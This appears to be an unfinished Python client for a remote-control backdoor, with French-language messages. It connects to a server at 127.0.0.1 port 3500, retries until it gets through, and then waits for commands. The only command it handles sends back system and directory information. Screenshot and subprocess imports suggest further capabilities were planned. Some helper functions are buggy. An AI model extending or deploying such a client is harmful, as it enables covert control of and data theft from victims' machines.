
import socket
import time
import subprocess
import os
import platform
import pyautogui
from PIL import ImageGrab

HOST_IP = "127.0.0.1"
HOST_PORT = 3500
MAX_DATA_SIZE = 1024

def command_infos():
    return platform.platform() + " " + os.getcwd()
    # reponse = reponse.encode('ascii', errors='ignore')

def recive():
    data = s.recv(MAX_DATA_SIZE)
    
def send(data):
    s.sendall(data.encode('ascii', errors='ignore'))
    
def send_and_recive(data):
    send(data.encode('ascii', errors='ignore'))
    data = recive()
    return data.decode('ascii', errors='ignore')
    

print(f"Connexion au serveur {HOST_IP}, port {HOST_PORT}")

while True:
    try:
        s = socket.socket()
        s.connect((HOST_IP, HOST_PORT))
    except ConnectionRefusedError:
        print("Erreur : impossible de se connecter au serveur. Reconnexion...")
        time.sleep(4)
    else:
        print("Connecté au serveur")
        break


while True:
    
    commande_data = s.recv(MAX_DATA_SIZE)
    commande = commande_data.decode('ascii', errors='ignore')
    
    if commande == "command_infos":
        reponse = command_infos()
        send(reponse)
        

